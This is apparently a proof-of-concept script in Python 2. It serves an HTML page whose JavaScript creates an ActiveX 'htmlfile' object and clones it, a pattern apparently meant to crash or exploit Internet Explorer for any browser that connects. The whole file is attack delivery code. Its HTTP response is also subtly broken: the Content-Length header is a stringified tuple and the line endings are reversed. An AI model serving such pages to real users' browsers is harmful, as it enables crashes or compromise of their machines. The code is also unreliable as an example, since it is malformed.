#!/usr/bin/env python
import socket, sys

serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serversocket.bind((socket.gethostname(), 4311))
serversocket.listen(5)

htmlbody = "<html>\
    <script lang='JavaScript'>\
       var axobj = new ActiveXObject('htmlfile');\
       axobj.cloneNode(1);\
    </script>\
   </html>"

httpresp = "HTTP/1.1 200 OK\n\r"
httphead = "Content-Length: %s\n\r\n\r", (str(len(htmlbody)), )

resp = httpresp + str(httphead) + htmlbody
print resp

while 1:
   (clientsocket, address) = serversocket.accept()
   print 'Incoming communication from', address
   print clientsocket.recv(100)
   clientsocket.send(resp)
   clientsocket.close()
   #serversocket.close()
